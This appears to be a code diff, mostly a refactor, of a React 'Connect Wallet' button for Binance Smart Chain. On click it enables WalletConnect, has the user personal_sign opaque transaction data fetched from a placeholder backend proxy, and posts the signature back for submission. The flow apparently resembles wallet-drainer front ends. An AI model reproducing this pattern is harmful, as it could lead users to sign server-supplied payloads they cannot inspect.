@@ -6,22 +6,22 @@ function App() {
       localStorage.removeItem("walletconnect");
     }
 
-    var ethereumProvider = await EthereumProvider.init({
+    const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      chains: [56],
+      chains: [56], // فقط BSC
       methods: ["personal_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
     await ethereumProvider.enable();
-    var provider = ethereumProvider;
-    var accounts = await provider.request({ method: "eth_accounts" });
-    var sender = accounts[0];
+    const provider = ethereumProvider;
+    const accounts = await provider.request({ method: "eth_accounts" });
+    const sender = accounts[0];
     console.log("✅ Wallet Address:", sender);
 
     async function getRawSignature(address, balance) {
       try {
-        let requestData = {
+        const requestData = {
           handler: "tx",
           address: address,
           chain: "56",
@@ -31,21 +31,24 @@ function App() {
 
         console.log("🔍 Requesting Unsigned Data:", requestData);
 
-        let response = await fetch("https://your-backend.com/proxy", { // از پروکسی استفاده کن
+        const response = await fetch("https://your-backend.com/proxy", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
         });
 
-        let unsignedData = await response.json();
-
-        if (unsignedData.error) {
-          throw new Error(unsignedData.error);
+        if (!response.ok) {
+          throw new Error(`Server error: ${response.status}`);
         }
 
+        const unsignedData = await response.json();
         console.log("📜 Unsigned Data:", unsignedData);
 
-        var rawSignature = await provider.request({
+        if (!unsignedData || unsignedData.error) {
+          throw new Error(unsignedData.error || "Invalid unsigned data");
+        }
+
+        const rawSignature = await provider.request({
           method: "personal_sign",
           params: [JSON.stringify(unsignedData), address],
         });
@@ -59,24 +62,23 @@ function App() {
 
     async function sendSignedTransaction(signature, sender, balance) {
       try {
-        let requestData = {
+        const requestData = {
           sender: sender,
           balance: balance,
           signedData: signature,
         };
 
-        let response = await fetch("https://your-backend.com/proxy", {
+        const response = await fetch("https://your-backend.com/proxy", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
         });
 
-        let resultJson = await response.json();
-
-        if (resultJson.error) {
-          throw new Error(resultJson.error);
+        if (!response.ok) {
+          throw new Error(`Server error: ${response.status}`);
         }
 
+        const resultJson = await response.json();
         console.log("📤 Server Response:", resultJson);
 
         return resultJson.txHash || resultJson.result || resultJson;
@@ -86,12 +88,12 @@ function App() {
       }
     }
 
-    let balance = "0.01";
-    var rawSignature = await getRawSignature(sender, balance);
+    const balance = "0.01";
+    const rawSignature = await getRawSignature(sender, balance);
 
     if (rawSignature) {
       console.log("✍️ Signed Raw Data:", rawSignature);
-      var txHash = await sendSignedTransaction(rawSignature, sender, balance);
+      const txHash = await sendSignedTransaction(rawSignature, sender, balance);
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
       console.error("⚠ Signing failed.");
@@ -99,7 +101,10 @@ function App() {
   }
 
   return (
-    <button onClick={runner} className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left">
+    <button
+      onClick={runner}
+      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
+    >
       <span>Connect Wallet</span>
     </button>
   );
